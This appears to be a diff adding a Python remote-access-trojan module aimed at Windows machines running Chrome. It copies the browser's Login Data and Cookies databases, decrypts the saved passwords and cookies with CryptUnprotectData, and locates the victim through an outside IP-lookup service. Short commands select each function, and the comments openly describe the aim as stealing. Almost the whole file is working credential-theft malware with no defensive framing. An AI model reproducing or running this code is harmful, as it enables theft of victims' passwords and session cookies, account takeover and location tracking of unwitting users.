@@ -1,0 +1,74 @@
+import os
+import sqlite3
+import requests
+import shutil
+import socket
+import json
+from win32crypt import CryptUnprotectData
+from base64 import b64decode
+
+# Grab passwords from Chrome
+def steal_passwords():
+    path = os.getenv("APPDATA") +"\\..\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
+    if not os.path.exists(path):
+        return"No Chrome passwords found, bitch."
+    
+    shutil.copy2(path,"temp_login_data")
+    conn = sqlite3.connect("temp_login_data")
+    cursor = conn.cursor()
+    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+    
+    stolen_data = []
+    for url, username, encrypted_pass in cursor.fetchall():
+        password = CryptUnprotectData(encrypted_pass, None, None, None, 0)[1].decode()
+        stolen_data.append(f"URL: {url} | User: {username} | Pass: {password}")
+    
+    conn.close()
+    os.remove("temp_login_data")
+    return"\n".join(stolen_data) if stolen_data else"No passwords to snatch."
+
+# Snag cookies from Chrome
+def steal_cookies():
+    path = os.getenv("APPDATA") +"\\..\\Local\\Google\\Chrome\\User Data\\Default\\Cookies"
+    if not os.path.exists(path):
+        return"No Chrome cookies found, dumbass."
+    
+    shutil.copy2(path,"temp_cookies")
+    conn = sqlite3.connect("temp_cookies")
+    cursor = conn.cursor()
+    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
+    
+    stolen_cookies = []
+    for host, name, encrypted_value in cursor.fetchall():
+        cookie = CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode()
+        stolen_cookies.append(f"Host: {host} | Name: {name} | Cookie: {cookie}")
+    
+    conn.close()
+    os.remove("temp_cookies")
+    return"\n".join(stolen_cookies) if stolen_cookies else"No cookies to grab."
+
+# Geolocate the victim
+def geolocate():
+    ip = socket.gethostbyname(socket.gethostname())
+    response = requests.get(f"http://ip-api.com/json/{ip}")
+    data = response.json()
+    if data["status"] =="success":
+        return f"Lat: {data['lat']} | Lon: {data['lon']} | City: {data['city']} | Country: {data['country']}"
+    return"Couldn’t geolocate, shit went sideways."
+
+# Main RAT command handler
+def rat_command(command):
+    if command == "!pg":
+        return steal_passwords()
+    elif command == "!cok":
+        return steal_cookies()
+    elif command == "!geo":
+        return geolocate()
+    else:
+        return"Unknown command, you fucking moron."
+
+# Example usage
+if __name__ == "__main__":
+    print(rat_command("!pg"))
+    print(rat_command("!cok"))
+    print(rat_command("!geo"))
